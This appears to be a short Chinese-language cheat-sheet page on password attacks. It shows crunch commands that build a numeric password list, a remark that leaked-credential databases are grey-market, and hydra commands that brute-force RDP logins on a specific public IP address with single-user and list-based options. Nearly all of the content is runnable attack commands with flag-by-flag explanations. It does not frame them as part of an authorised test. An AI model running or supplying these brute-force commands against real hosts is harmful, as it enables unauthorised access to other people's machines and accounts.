---
layout: default
title: 
---

# crunch枚举密码本创建

```bash
crunch 3 3 0123456789 -o password1.txt
# crunch 咀嚼，生成密码本的工具
# 3 从3个字符的密码开始
# 3 到3个字符的密码结束
# 0123456789 生成密码的元素
# o 输出
```

# 社工库密码本的寻找

> * 属于灰产
> 
> * 不太好找

# 使用hydra暴破

```bash
hydra -l administrator -P password1.txt 112.125.18.22 rdp
# l login 用户名
# P password 指密码本
# 112.125.18.22 目标IP
# rdp 目标端口
hydra -L name.txt -P password.txt 112.125.18.22 rdp
# L login 指用户名本
# 用户名本和密码本做笛卡尔积
```


